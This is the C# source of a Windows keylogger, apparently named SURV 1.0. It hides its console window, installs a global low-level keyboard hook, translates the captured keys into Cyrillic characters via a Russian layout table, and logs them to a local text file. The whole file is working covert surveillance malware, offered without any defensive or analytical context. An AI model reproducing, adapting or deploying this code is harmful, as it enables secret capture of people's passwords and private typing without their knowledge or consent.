using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace SURV_1._0
{
	class KeyHook
	{
		[DllImport("kernel32.dll")]

		static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]

		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		const int SW_HIDE = 0;
		const int SW_SHOW = 5;

		private const int WH_KEYBOARD_LL = 13;
		private const int WM_KEYDOWN = 0x0100;
		private static LowLevelKeyboardProc _proc = HookCallback;
		private static IntPtr _hookID = IntPtr.Zero;

		private static string[] RKey = new string[] { "Ô", "Û", "Â", "À", "É", "Ö", "Ó", "Ê", "Å", "Í", "Ã", "Ø", "Ù", "Ç", "Õ", "Ú", "Ï", "Ð", "Î", " ", "Ë", "Ä", "Æ", "Ý", "¨", "ß", "×", "Ñ", "Ì", "È", "Ò", "Ü", "Á", "Þ", "." };
		private static string[] EKey = new string[] { "A", "S", "D", "F", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "G", "H", "J", "Space", "K", "L", ";", "'", "`", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/" };

		public static void Main()

		{
			System.IO.File.WriteAllText("WriteText.txt", string.Empty);

			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
			_hookID = SetHook(_proc);

			KeyHook dlg = new KeyHook();

			Application.Run();

			UnhookWindowsHookEx(_hookID);

		}

		private static IntPtr SetHook(LowLevelKeyboardProc proc)

		{

			using (Process curProcess = Process.GetCurrentProcess())
			using (ProcessModule curModule = curProcess.MainModule)

			{

				return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
				GetModuleHandle(curModule.ModuleName), 0);

			}

		}

		private delegate IntPtr LowLevelKeyboardProc(
		int nCode, IntPtr wParam, IntPtr lParam);
		private static IntPtr HookCallback(
		int nCode, IntPtr wParam, IntPtr lParam)

		{
			if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)

			{

				int vkCode = Marshal.ReadInt32(lParam);
				Console.WriteLine((Keys)vkCode);
				string text = ((Keys)vkCode).ToString();
				string text2 = "";

				for (int i = 0; i < EKey.Length; i++)

				{

					if (text == EKey[i]) text2 = RKey[i];

				}

				System.IO.File.AppendAllText("WriteText.txt", text2.Substring(0));

			}

			return CallNextHookEx(_hookID, nCode, wParam, lParam);

		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr SetWindowsHookEx(int idHook,
		LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
		IntPtr wParam, IntPtr lParam);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

	}
}
